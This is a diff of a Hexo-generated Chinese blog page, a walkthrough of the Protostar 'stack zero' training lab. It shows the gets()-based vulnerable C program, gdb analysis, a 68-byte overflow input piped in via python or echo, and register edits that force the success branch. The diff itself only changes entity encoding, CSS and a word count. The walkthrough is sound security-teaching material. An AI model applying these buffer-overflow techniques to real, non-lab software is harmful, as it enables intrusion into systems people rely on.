@@ -53,7 +53,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1"></head>
+<meta name="generator" content="Hexo 5.4.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
 
 
 <body>
@@ -436,32 +438,32 @@
                 <span id="more"></span>
 
 <h1 id="Pwn-protostar靶场1-stack-zero"><a href="#Pwn-protostar靶场1-stack-zero" class="headerlink" title="Pwn-protostar靶场1  stack_zero"></a>Pwn-protostar靶场1  stack_zero</h1><p>本靶场所有程序源码包括靶场虚拟机镜像地址</p>
-<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;exploit.education&#x2F;protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">https://exploit.education/protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>stack zero源码：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
   modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have changed the 'modified' variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="gets函数漏洞："><a href="#gets函数漏洞：" class="headerlink" title="gets函数漏洞："></a>gets函数漏洞：</h3><p><img src="/img/98395e2dd8699221a3b9fbf7a231cffc.png"> </p>
 <p>永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。 </p>
 <h2 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h2><p> 我们使用gdb打开程序进行进一步的分析 </p>
-<pre class="line-numbers language-none"><code class="language-none">gdb &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">gdb /opt/protostar/bin/stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731285612070.png"></p>
 <p>然后查看汇编代码，了解程序堆栈如何工作</p>
@@ -529,10 +531,10 @@ End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span><
 <pre class="line-numbers language-none"><code class="language-none">define hook-stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p> 这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令 </p>
-<pre class="line-numbers language-none"><code class="language-none">info registers   &#x2F;&#x2F;显示寄存器里的地址
-x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
-x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
-end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">info registers   //显示寄存器里的地址
+x/24wx $esp      //显示esp寄存器里的内容
+x/2i $eip        //显示eip寄存器里的内容
+end              //结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> 然后我们输入run运行程序到第一个断点 </p>
 <p><img src="/img/1731286657496.png"></p>
@@ -542,13 +544,13 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
 <p><img src="/img/1731286911539.png"></p>
 <p><img src="/img/1731287011867.png"></p>
 <p>可以看到0x61是a的ascii码</p>
-<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c            &#x2F;&#x2F;查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">x/wx $esp+0x5c            //查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287066725.png"></p>
 <p> 算了一下，我们需要68个字符才能覆盖(从第一个0x61开始一共有16个4字节才能到0x00000000，要覆盖他还有4字节，所以一共68个字节)<br> 输入q退出gdb<br> 然后使用echo或者python对程序进行输入(二选一)</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'print "a"*(16*4+4)'</span> <span class="token operator">|</span> <span class="token operator">/</span>opt<span class="token operator">/</span>protostar<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | /opt/protostar/bin/stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287448288.png"></p>
 <p> 可以看到，我们已经成功打印出了正确的字符 </p>
@@ -565,11 +567,11 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
 <p> 查看程序汇编代码 </p>
 <p><img src="/img/1731287864176.png"></p>
 <p>如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the ‘modified’ variable也就是破解成功了<br>现在我们修改eip寄存器的值</p>
-<pre class="line-numbers language-none"><code class="language-none">set $eip&#x3D;0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set $eip=0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p> 修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址 </p>
 <p><img src="/img/1731287958947.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">n &#x2F;&#x2F;执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">n //执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731287994713.png"></p>
 <p>破解成功</p>
@@ -581,7 +583,7 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
 <p> 查看所有寄存器里的值 </p>
 <p><img src="/img/1731288229480.png"></p>
 <p> 修改eax寄存器里的值 </p>
-<pre class="line-numbers language-none"><code class="language-none">set $eax &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set $eax = 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731288271210.png"></p>
 <p> 然后继续运行程序 </p>
@@ -1016,7 +1018,7 @@ end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">42.3k</span>
+                        class="white-color">41.6k</span>
             
             
             
